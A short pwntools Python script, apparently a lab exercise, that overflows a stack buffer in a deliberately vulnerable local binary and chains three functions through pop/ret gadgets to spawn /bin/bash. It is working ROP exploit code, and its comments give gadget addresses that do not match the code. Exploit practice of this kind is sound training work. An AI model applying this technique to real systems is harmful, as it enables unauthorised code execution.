# coding: utf-8


# ROP test for the executable vuln1_stack.
#  Chains the functions add_bin, add_bash, and exec_string:
#  add_bin:      0x80493c3  (parameters 0xdeadbeef)
#  add_bash:     0x804940a (parameters: 0xcafebabe, 0x0badf00d)
#  exec_string:  0x8049387
#
#  To find gadgets to chain:
#      $ ropper --file vuln --nocolor | grep ret | grep pop


#   pop ret: 0x08049217
#   pop pop ret: 0x08049216
#
# To test: first run sh to see that /bin/bash starts afterwards.
# Then run: ./rop.py
	
from pwn import * 

# addresses definition 

add_bin = 	0x80493c3
add_bash = 	0x804940a
exec_string = 	0x8049387
pop_ret = 	0x0804947c
pop_pop_ret = 	0x0804947b


p = b''
p += b'A' * 500
p += b'B' * 16
p += p32(add_bin)
p += p32(pop_ret)
p += p32(0xdeadbeef)
p += p32(add_bash)
p += p32(pop_pop_ret)
p += p32(0xcafebabe)
p += p32(0x0badf00d)
p += p32(exec_string)

proc = process(['./vuln_stack_nx', p])
proc.interactive()



